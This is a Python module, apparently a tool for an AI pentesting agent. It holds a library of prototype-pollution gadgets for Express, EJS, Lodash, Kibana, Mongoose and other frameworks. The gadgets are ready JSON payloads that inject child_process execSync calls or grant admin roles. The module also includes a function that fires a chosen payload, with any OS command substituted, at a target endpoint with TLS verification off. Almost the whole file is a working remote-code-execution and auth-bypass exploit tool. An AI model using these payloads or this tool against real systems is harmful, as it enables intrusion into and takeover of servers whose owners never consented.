"""
Prototype-pollution → RCE gadget library.

Detection of `__proto__` / `constructor.prototype` pollution is a half-bug.
Real impact comes from chaining a polluted property against a sink in the
target's stack. This module:

  - lists known gadgets per framework (Express, Mongoose, Lodash, Kibana, EJS)
  - generates exploit payloads tailored to each
  - probes a target endpoint that already accepts JSON for pollution + gadget
"""

from __future__ import annotations

import json

import requests

from src.sdk.tool import function_tool


GADGETS: dict[str, dict] = {
    "express-shell": {
        "framework": "Express",
        "version_range": "≤ 4.x with res.locals lookup",
        "description": "Pollute outputFunctionName → controlled JS prepended to template renders",
        "payload": {
            "constructor": {"prototype": {"outputFunctionName": "x;process.mainModule.require('child_process').execSync('CMD_HERE');x"}}
        },
        "trigger": "Any subsequent res.render() with a server-side EJS/handlebars template.",
    },
    "ejs-rce": {
        "framework": "EJS ≤ 3.1.x",
        "description": "Pollute escapeFunction with our own `Function('return process')()` for RCE on render.",
        "payload": {
            "__proto__": {
                "client": True,
                "escapeFunction": "JSON.stringify;process.mainModule.require('child_process').execSync('CMD_HERE')"
            }
        },
        "trigger": "render of any EJS template",
    },
    "lodash-merge": {
        "framework": "Lodash ≤ 4.17.20",
        "description": "Trigger pollution via lodash.merge / lodash.set on attacker JSON; chain with downstream property reads.",
        "payload": {
            "__proto__": {"polluted": "yes", "isAdmin": True, "role": "admin"}
        },
        "trigger": "Authorization checks that read req.user.isAdmin / req.session.role.",
    },
    "kibana-rce": {
        "framework": "Kibana < 6.6.1 (CVE-2019-7609)",
        "description": "Pollute Object.prototype.then to inject Node.js process control via Timelion.",
        "payload": {
            "constructor": {"prototype": {"sourceURL": "*\\nprocess.mainModule.require(\\\"child_process\\\").execSync(\\\"CMD_HERE\\\")\\n*//"}}
        },
        "trigger": "Submit a Timelion expression .es().props(label='x')",
    },
    "mongoose-overwrite": {
        "framework": "Mongoose ≤ 5.x",
        "description": "Pollute schema constructors so Model.find({}) returns attacker docs.",
        "payload": {
            "__proto__": {"$gt": ""}
        },
        "trigger": "Auth bypass via Model.findOne({user, pass}) — operator injection.",
    },
    "next-config": {
        "framework": "Next.js ≤ 12 (uncommon)",
        "description": "Pollute publicRuntimeConfig — leaked in client bundle; non-RCE but data exposure.",
        "payload": {
            "__proto__": {"publicRuntimeConfig": {"injected": "true"}}
        },
        "trigger": "Any subsequent SSR page render.",
    },
    "express-static": {
        "framework": "express-fileupload ≤ 1.1.7-alpha.3",
        "description": "Send {parseNested:true} JSON to upload endpoint; payload pollutes globally.",
        "payload": {
            "__proto__.outputFunctionName": "x;require('child_process').exec('CMD_HERE');x"
        },
        "trigger": "Any res.render after a successful pollution.",
    },
}


@function_tool()
def proto_pollution_list_gadgets(framework: str = "") -> str:
    """
    List known prototype-pollution gadgets, optionally filtered by framework.

    Args:
        framework: Substring (e.g. 'express', 'lodash', 'ejs'). Empty = all.
    """
    out = ["## Prototype-Pollution Gadget Library"]
    needle = framework.lower().strip()
    for name, g in GADGETS.items():
        if needle and needle not in name.lower() and needle not in g["framework"].lower():
            continue
        out.append(f"\n[{name}]  framework: {g['framework']}")
        out.append(f"  description : {g['description']}")
        out.append(f"  trigger     : {g['trigger']}")
        out.append(f"  payload     : {json.dumps(g['payload'])[:300]}")
    return "\n".join(out)


@function_tool()
def proto_pollution_exploit(
    target_url: str,
    gadget: str,
    command: str = "id",
    headers: str = "{}",
    method: str = "POST",
) -> str:
    """
    Send a prototype-pollution gadget payload at a JSON-accepting endpoint.

    Args:
        target_url: JSON endpoint suspected of pollution (e.g. /api/profile)
        gadget:     Gadget key from GADGETS (express-shell, ejs-rce, lodash-merge, …)
        command:    OS command to inject (substituted into payload's CMD_HERE)
        headers:    JSON of session/auth headers
        method:     POST or PUT
    """
    if gadget not in GADGETS:
        return f"Error: unknown gadget '{gadget}'. Run proto_pollution_list_gadgets() first."
    try:
        bh = json.loads(headers) if headers else {}
    except Exception:
        bh = {}
    bh.setdefault("Content-Type", "application/json")

    g = GADGETS[gadget]
    payload = json.loads(json.dumps(g["payload"]).replace("CMD_HERE", command))

    try:
        r = requests.request(method, target_url, headers=bh, json=payload, timeout=15, verify=False)
    except Exception as e:
        return f"Error sending payload: {e}"

    out = [f"## Pollution exploit: {gadget} → {target_url}",
           f"HTTP {r.status_code}",
           f"Body: {(r.text or '')[:300]}",
           f"\n[Trigger] {g['trigger']}",
           "[Verify] Run interactsh_poll() if you embedded an OOB callback in CMD."]
    return "\n".join(out)
